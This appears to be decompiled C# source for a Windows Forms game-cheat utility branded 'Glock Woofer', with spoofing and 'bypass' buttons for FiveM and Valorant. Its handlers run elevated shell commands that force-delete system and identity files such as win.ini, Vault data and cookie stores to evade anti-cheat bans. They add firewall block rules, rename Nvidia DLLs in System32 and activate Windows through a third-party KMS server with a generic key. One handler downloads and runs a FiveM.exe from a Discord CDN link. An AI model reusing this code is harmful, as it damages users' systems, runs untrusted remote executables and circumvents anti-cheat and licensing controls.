using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Windows.Forms;
using Siticone.UI.AnimatorNS;
using Siticone.UI.WinForms;
using Test;
using Test2;
using Test3;

namespace Auth.GG_Winform_Example
{
	// Token: 0x0200001A RID: 26
	public partial class Main : Form
	{
		// Token: 0x060000D8 RID: 216 RVA: 0x0000E0E2 File Offset: 0x0000C2E2
		public Main()
		{
			this.InitializeComponent();
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x0000E0FA File Offset: 0x0000C2FA
		private void siticoneControlBox1_Click(object sender, EventArgs e)
		{
			Environment.Exit(0);
		}

		// Token: 0x060000DA RID: 218 RVA: 0x0000E104 File Offset: 0x0000C304
		private void Main_Load(object sender, EventArgs e)
		{
			this.siticoneCirclePictureBox1.Load(User.ProfilePicture);
			this.welcome.Text = "Welcome back, " + User.Username + "!";
			this.userid.Text = "ID: " + User.ID;
			this.username.Text = "Username: " + User.Username;
			this.email.Text = "Email: " + User.Email;
			this.hwid.Text = "HWID: " + User.HWID;
			this.uservariable.Text = "User Variable: " + User.UserVariable;
			this.userrank.Text = "Rank: " + User.Rank;
			this.ip.Text = "IP: " + User.IP;
			this.expiry.Text = "Expiry: " + User.Expiry;
			this.lastlogin.Text = "Last Login: " + User.LastLogin;
			this.registerdate.Text = "Register Date: " + User.RegisterDate;
		}

		// Token: 0x060000DB RID: 219 RVA: 0x0000E251 File Offset: 0x0000C451
		private void hwid_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000DC RID: 220 RVA: 0x0000E254 File Offset: 0x0000C454
		private void welcome_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000DD RID: 221 RVA: 0x0000E257 File Offset: 0x0000C457
		internal static string GenID(int v)
		{
			throw new NotImplementedException();
		}

		// Token: 0x060000DE RID: 222 RVA: 0x0000E260 File Offset: 0x0000C460
		private void siticoneRoundedButton1_Click_1(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Filter = "Image Files(*.jpg; *.png; *.jpeg; *.gif; *.bmp)|*.jpg; *.png; *.jpeg; *.gif; *.bmp)";
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				string fileName = openFileDialog.FileName;
				string path = Convert.ToBase64String(File.ReadAllBytes(fileName));
				API.UploadPic(User.Username, path);
			}
		}

		// Token: 0x060000DF RID: 223 RVA: 0x0000E2AE File Offset: 0x0000C4AE
		private void siticonePictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x0000E2B1 File Offset: 0x0000C4B1
		private void siticoneRoundedButton2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x0000E2B4 File Offset: 0x0000C4B4
		private void siticoneRoundedButton2_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x0000E2B7 File Offset: 0x0000C4B7
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x0000E2BA File Offset: 0x0000C4BA
		private void siticoneRoundedButton4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x0000E2BD File Offset: 0x0000C4BD
		private void siticoneRoundedButton6_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x0000E2C0 File Offset: 0x0000C4C0
		private void siticoneRoundedButton4_Click_1(object sender, EventArgs e)
		{
			base.Hide();
			Test.Loader loader = new Test.Loader();
			loader.Show();
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x0000E2E4 File Offset: 0x0000C4E4
		private void siticoneRoundedButton3_Click(object sender, EventArgs e)
		{
			base.Hide();
			Test.Loader loader = new Test.Loader();
			loader.Show();
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x0000E308 File Offset: 0x0000C508
		private void siticoneRoundedButton7_Click(object sender, EventArgs e)
		{
			Login login = new Login();
			login.Show();
			base.Hide();
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x0000E32C File Offset: 0x0000C52C
		private void siticoneRoundedButton7_Click_1(object sender, EventArgs e)
		{
			Login login = new Login();
			login.Show();
			base.Hide();
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0000E34E File Offset: 0x0000C54E
		private void siticoneRoundedButton5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0000E354 File Offset: 0x0000C554
		private void siticoneRoundedButton8_Click(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\browser");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashometry");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\launcher_skip_mtl2");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\session");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\plugins");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\mods");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\logs");
				streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\crashes");
				streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\caches.XML");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Glock Woofer: Cache Cleaned!");
		}

		// Token: 0x060000EB RID: 235 RVA: 0x0000E46C File Offset: 0x0000C66C
		private void siticoneRoundedButton9_Click(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("powercfg - s 8c5e7fda - e8bf - 4a96 - 9a85 - a6e23a8c635c");
				streamWriter.WriteLine("taskkill / f / im GTAVLauncher.exe");
				streamWriter.WriteLine("wmic process where name = FiveM_b2189_GTAProcess.exe CALL setpriority 128");
				streamWriter.WriteLine("taskkill / f / im wmpnetwk.exe.exe");
				streamWriter.WriteLine("taskkill / f / im OneDrive.exe");
				streamWriter.WriteLine("taskkill / f / im speedfan.exe");
				streamWriter.WriteLine("taskkill / f / im TeamWiever_Service.exe");
				streamWriter.WriteLine("taskkill / f / im opera.exe");
				streamWriter.WriteLine("taskkill / f / im java.exed");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Glock Woofer: Optimized FiveM!");
		}

		// Token: 0x060000EC RID: 236 RVA: 0x0000E548 File Offset: 0x0000C748
		private void siticoneRoundedButton3_Click_1(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("del /s /q %systemdrive%\\Windows\\Temp\\*.*");
				streamWriter.WriteLine("del / s / q % userprofile %\\AppData\\Local\\Temp\\*.* ");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Glock Woofer: Temp has been cleared Successfully!");
		}

		// Token: 0x060000ED RID: 237 RVA: 0x0000E5D0 File Offset: 0x0000C7D0
		private void siticoneRoundedButton10_Click(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("ipconfig /flushdns");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Glock Spoofer: Dns cache has been cleared");
		}

		// Token: 0x060000EE RID: 238 RVA: 0x0000E64C File Offset: 0x0000C84C
		private void siticoneRoundedButton11_Click(object sender, EventArgs e)
		{
			string text = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("del /s /q %systemdrive%\\$Recycle.bin\\*.*");
			}
			Process process = Process.Start(text);
			process.WaitForExit();
			File.Delete(text);
			MessageBox.Show("Glock Spoofer: Recycle bin has been cleared");
		}

		// Token: 0x060000EF RID: 239 RVA: 0x0000E6C8 File Offset: 0x0000C8C8
		private void siticoneRoundedButton12_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x0000E6CC File Offset: 0x0000C8CC
		private void siticoneRoundedButton12_Click_1(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
				}
			}.Start();
			this.musicv2();
			MessageBox.Show("FiveM Bypassed Enabled", "Glock Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x0000E768 File Offset: 0x0000C968
		public void musicv1()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/931203518612766742/946734107889655828/music.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0000E7BC File Offset: 0x0000C9BC
		public void musicv5()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/964942430480785408/985192670857138236/discordidios.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x0000E810 File Offset: 0x0000CA10
		public void musicv2()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/964942430480785408/984778409169260544/bypassersound.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x0000E864 File Offset: 0x0000CA64
		public void musicv3()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/964942430480785408/984778409169260544/bypassersound.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000E8B8 File Offset: 0x0000CAB8
		public void musicv4()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/964942430480785408/985151119594508288/windows.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x0000E90C File Offset: 0x0000CB0C
		private void siticoneRoundedButton13_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
				}
			}.Start();
			this.musicv2();
			MessageBox.Show("FiveM Bypassed Disabled", "Glock Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0000E9A6 File Offset: 0x0000CBA6
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x0000E9AC File Offset: 0x0000CBAC
		private void siticoneRoundedButton14_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C del /f \"C:\\Windows\\win.ini\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Manifest_NonUFSFiles_Win64.txt\" && del /f \"C:\\Riot Games\\VALORANT\\live\\Engine\\Binaries\\ThirdParty\\CEF3\\Win64\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\Plugins\\plugin - manifest.json\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\icudtl.dat\" && del /f \"C:\\Riot Games\\Riot Client\\UX\\natives_blob.bin\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Vault\\UserProfileRoaming\\Latest.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\AC\\INetCookies\\ESE\\container.dat\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\UnrealEngine\\4.23\\Saved\\Config\\WindowsClient\\Manifest.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\OneDrive\\logs\\Common\\DeviceHealthSummaryConfiguration.ini\" && del /f \"C:\\ProgramData\\Microsoft\\Windows\\DeviceMetadataCache\\dmrc.idx\" && del /f \"C:\\Users\\%username%\\ntuser.ini\" && del /f \"C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\container.dat\" && del /f \"C:\\System Volume Information\\tracking.log\" && del /f \"D:\\System Volume Information\\tracking.log\""
				}
			}.Start();
			this.musicv1();
			MessageBox.Show("Spoofed Valorant", "Glock Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x0000EA48 File Offset: 0x0000CC48
		private void siticoneRoundedButton15_Click(object sender, EventArgs e)
		{
			Login login = new Login();
			login.Show();
			base.Hide();
		}

		// Token: 0x060000FA RID: 250 RVA: 0x0000EA6C File Offset: 0x0000CC6C
		private void siticoneRoundedButton20_Click(object sender, EventArgs e)
		{
			Class1 @class = new Class1();
			@class.spoofUserMode();
			bool flag = File.Exists("C:\\Windows\\System32\\nvml.dll");
			bool flag2 = flag;
			if (flag2)
			{
				try
				{
					File.Move("C:\\Windows\\System32\\nvml.dll", "C:\\Windows\\System32\\nvml2.dll");
					File.Move("C:\\Windows\\System32\\nvmld.dll", "C:\\Windows\\System32\\nvmld2.dll");
				}
				catch
				{
				}
			}
			MessageBox.Show("Cleaned Nvidia Logger!", "Glock Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000FB RID: 251 RVA: 0x0000EAE8 File Offset: 0x0000CCE8
		private void siticoneRoundedButton21_Click(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string processName = "FiveM";
			string processName2 = "Steam";
			Process process = Process.GetProcessesByName(processName).FirstOrDefault<Process>();
			bool flag = process != null;
			if (flag)
			{
				process.CloseMainWindow();
				process.Kill();
				process.WaitForExit();
				process.Dispose();
			}
			Process process2 = Process.GetProcessesByName(processName2).FirstOrDefault<Process>();
			bool flag2 = process2 != null;
			if (flag2)
			{
				process2.CloseMainWindow();
				process2.Kill();
				process2.WaitForExit();
				process2.Dispose();
			}
			bool flag3 = !File.Exists(folderPath + "\\FiveM\\FiveM.exe");
			if (flag3)
			{
				Console.Beep();
				MessageBox.Show("Failed To Clean", "Glock Woofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				DialogResult dialogResult = MessageBox.Show("Do you want to fix it for you?", "Glock Woofer", MessageBoxButtons.YesNo);
				bool flag4 = dialogResult == DialogResult.Yes;
				if (flag4)
				{
					bool flag5 = Directory.Exists(folderPath + "\\FiveM");
					if (flag5)
					{
						Directory.Delete(folderPath + "\\FiveM", false);
					}
					bool flag6 = !Directory.Exists(folderPath + "\\FiveM");
					if (flag6)
					{
						Directory.CreateDirectory(folderPath + "\\FiveM");
					}
					using (WebClient webClient = new WebClient())
					{
						webClient.DownloadFile("https://cdn.discordapp.com/attachments/950112367767851102/962261956880891924/FiveM.exe", folderPath + "\\FiveM\\FiveM.exe");
						Process.Start(folderPath + "\\FiveM\\FiveM.exe");
						MessageBox.Show("FiveM Downloaded and Started");
					}
				}
			}
			else
			{
				bool flag7 = Directory.Exists(folderPath + "\\DigitalEntitlements");
				if (flag7)
				{
					Directory.Delete(folderPath + "\\DigitalEntitlements", true);
				}
				bool flag8 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\crashes");
				if (flag8)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\crashes", true);
				}
				bool flag9 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\logs");
				if (flag9)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\logs", true);
				}
				bool flag10 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache");
				if (flag10)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\cache", true);
				}
				bool flag11 = Directory.Exists(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache");
				if (flag11)
				{
					Directory.Delete(folderPath + "\\FiveM\\FiveM Application Data\\data\\server-cache", true);
				}
				bool flag12 = Directory.Exists(folderPath2 + "\\CitizenFX");
				if (flag12)
				{
					Directory.Delete(folderPath2 + "\\CitizenFX", true);
				}
				this.musicv1();
				MessageBox.Show("Successfully Cleaned FiveM", "Glock Woofer - FiveM", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000EDAC File Offset: 0x0000CFAC
		private void siticoneRoundedButton22_Click(object sender, EventArgs e)
		{
			this.musicv5();
			Process.Start("https://discord.gg/eQMFQn84Fq");
		}

		// Token: 0x060000FD RID: 253 RVA: 0x0000EDC4 File Offset: 0x0000CFC4
		public static DateTime UnixTimeToDateTime(long unixtime)
		{
			DateTime result = new DateTime(1970, 1, 1, 0, 0, 0, 0, DateTimeKind.Local);
			result = result.AddSeconds((double)unixtime).ToLocalTime();
			return result;
		}

		// Token: 0x060000FE RID: 254 RVA: 0x0000EDFC File Offset: 0x0000CFFC
		private void siticoneRoundedButton23_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C net stop wuauserv && slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX && slmgr /skms kms.digiboy.ir && net start wuauserv"
				}
			}.Start();
			this.musicv3();
			MessageBox.Show("Activated Windows", "Glock Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x060000FF RID: 255 RVA: 0x0000EE96 File Offset: 0x0000D096
		private void siticoneRoundedButton24_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000100 RID: 256 RVA: 0x0000EE9C File Offset: 0x0000D09C
		private void siticoneRoundedButton25_Click(object sender, EventArgs e)
		{
			new Process
			{
				StartInfo = 
				{
					FileName = "cmd.exe",
					CreateNoWindow = true,
					RedirectStandardInput = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					Verb = "runas",
					Arguments = "/C net stop wuauserv && slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX && slmgr /skms kms.digiboy.ir && net start wuauserv"
				}
			}.Start();
			this.musicv4();
			MessageBox.Show("Activated Windows", "Glock Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000EF36 File Offset: 0x0000D136
		private void textBox1_TextChanged_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000102 RID: 258 RVA: 0x0000EF39 File Offset: 0x0000D139
		private void siticoneRoundedButton23_Click_1(object sender, EventArgs e)
		{
			Process.Start("fivem://connect/" + this.textBox1.Text);
		}

		// Token: 0x06000103 RID: 259 RVA: 0x0000EF58 File Offset: 0x0000D158
		private void siticoneRoundedButton18_Click(object sender, EventArgs e)
		{
			Test.Loader loader = new Test.Loader();
			loader.Show();
			base.Hide();
		}

		// Token: 0x06000104 RID: 260 RVA: 0x0000EF7C File Offset: 0x0000D17C
		public void pancake()
		{
			WebClient webClient = new WebClient();
			string tempPath = Path.GetTempPath();
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/964942430480785408/985619618519457802/im_a_pancake_1_hour_loop.wav", tempPath + this.grwXIswrPv + ".mp3");
			new SoundPlayer(tempPath + this.grwXIswrPv + ".mp3").Play();
		}

		// Token: 0x06000105 RID: 261 RVA: 0x0000EFD0 File Offset: 0x0000D1D0
		public void ZylLF00l2wNH()
		{
			DialogResult dialogResult = MessageBox.Show("Do you want to restart your PC?", "Glock Woofer", MessageBoxButtons.YesNo);
			bool flag = dialogResult == DialogResult.Yes;
			if (flag)
			{
				Process.Start(new ProcessStartInfo("shutdown.exe", "-r -t 0")
				{
					CreateNoWindow = true,
					UseShellExecute = false,
					ErrorDialog = false
				});
			}
		}

		// Token: 0x06000106 RID: 262 RVA: 0x0000F028 File Offset: 0x0000D228
		public static string GenerateDate(int size)
		{
			char[] array = new char[size];
			for (int i = 0; i < size; i++)
			{
				array[i] = "abcdef0123456789"[Test2.random.Next("abcdef0123456789".Length)];
			}
			return new string(array);
		}

		// Token: 0x06000107 RID: 263 RVA: 0x0000F078 File Offset: 0x0000D278
		private void siticoneRoundedButton17_Click(object sender, EventArgs e)
		{
			SystemSpoofer systemSpoofer = new SystemSpoofer();
			systemSpoofer.Show();
			base.Hide();
		}

		// Token: 0x06000108 RID: 264 RVA: 0x0000F09A File Offset: 0x0000D29A
		private void siticoneControlBox2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000109 RID: 265 RVA: 0x0000F0A0 File Offset: 0x0000D2A0
		private void siticoneRoundedButton16_Click(object sender, EventArgs e)
		{
			Test3.Loader loader = new Test3.Loader();
			loader.Show();
			base.Hide();
		}

		// Token: 0x0600010A RID: 266 RVA: 0x0000F0C2 File Offset: 0x0000D2C2
		private void Main_MouseClick(object sender, MouseEventArgs e)
		{
		}

		// Token: 0x0600010B RID: 267 RVA: 0x0000F0C5 File Offset: 0x0000D2C5
		private void siticoneRoundedButton3_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x0600010C RID: 268 RVA: 0x0000F0C8 File Offset: 0x0000D2C8
		private void siticoneRoundedButton3_Click_3(object sender, EventArgs e)
		{
		}

		// Token: 0x0600010D RID: 269 RVA: 0x0000F0CB File Offset: 0x0000D2CB
		private void checkBox1_CheckedChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600010E RID: 270 RVA: 0x0000F0CE File Offset: 0x0000D2CE
		private void siticoneRoundedTextBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600010F RID: 271 RVA: 0x0000F0D1 File Offset: 0x0000D2D1
		private void trannos_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000110 RID: 272 RVA: 0x0000F0D4 File Offset: 0x0000D2D4
		private void siticoneCirclePictureBox1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000111 RID: 273 RVA: 0x0000F0D7 File Offset: 0x0000D2D7
		private void siticoneRoundedButton3_Click_4(object sender, EventArgs e)
		{
			Process.Start("https://cdn.discordapp.com/attachments/964942430480785408/987018979275051008/Hwid_Serial_Checker.bat");
		}

		// Token: 0x06000112 RID: 274 RVA: 0x0000F0E8 File Offset: 0x0000D2E8
		private void timer1_Tick(object sender, EventArgs e)
		{
			this.date.Text = DateTime.Now.ToLongDateString();
			this.time.Text = DateTime.Now.ToLongTimeString();
		}

		// Token: 0x06000113 RID: 275 RVA: 0x0000F128 File Offset: 0x0000D328
		private void label4_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000114 RID: 276 RVA: 0x0000F12B File Offset: 0x0000D32B
